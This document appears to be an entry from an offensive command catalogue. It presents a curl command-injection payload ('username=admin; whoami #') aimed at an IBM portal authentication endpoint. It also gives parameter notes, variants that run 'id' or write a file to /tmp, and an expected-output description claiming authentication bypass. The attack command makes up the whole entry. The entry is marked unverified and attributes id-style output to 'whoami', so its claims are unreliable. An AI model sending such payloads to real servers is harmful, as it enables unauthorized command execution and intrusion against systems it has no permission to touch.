---
id: cmd-uuid-001
data: >-
  curl -X POST 'https://portal.ibm.com/middleware/auth' -d 'username=admin;
  whoami #' -H 'Content-Type: application/x-www-form-urlencoded' -v
name: curl-injection-payload
tags:
  - command-injection
  - http-request
type: command
output: null
executor: bash
platforms:
  - Web
  - Linux
created_at: '2025-04-11T00:00:00Z'
updated_at: '2025-12-14T17:31:52.573Z'
verified: false
validated: true
submitted: true
---
# curl-injection-payload

## Command

```bash
curl -X POST 'https://portal.ibm.com/middleware/auth' -d 'username=admin; whoami #' -H 'Content-Type: application/x-www-form-urlencoded' -v
```

## Description

This curl command sends an HTTP POST request to the IBM Portal middleware authentication endpoint with a command injection payload in the 'username' field. It exploits improper input validation to execute a shell command ('whoami') on the server, aiding in authentication bypass by revealing server context or manipulating responses.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies HTTP POST method | Yes |
| `'https://portal.ibm.com/middleware/auth'` | Target vulnerable endpoint URL | Yes |
| `-d 'username=admin; whoami #'` | Payload data with injection (; separates commands, # comments out rest) | Yes |
| `-H 'Content-Type: application/x-www-form-urlencoded'` | Sets request header for form data | Yes |
| `-v` | Verbose output for debugging | No |

## Examples

### Basic Usage

```bash
curl -X POST 'https://portal.ibm.com/middleware/auth' -d 'input=; id #' -H 'Content-Type: application/x-www-form-urlencoded'
```

### Advanced Usage

```bash
curl -X POST 'https://portal.ibm.com/middleware/auth' -d 'username=admin; echo "bypassed" > /tmp/flag #' --cookie 'session=inject' -v
```

## Expected Output

Successful execution shows verbose HTTP details, including a 200 OK response with potential command output (e.g., 'uid=33(www-data) gid=33(www-data)' from 'whoami') embedded in the body, indicating injection success and auth bypass.

## Related

- [[Related Procedure|procedures/Exploit-Command-Injection-for-Auth-Bypass-in-IBM-Portal]]
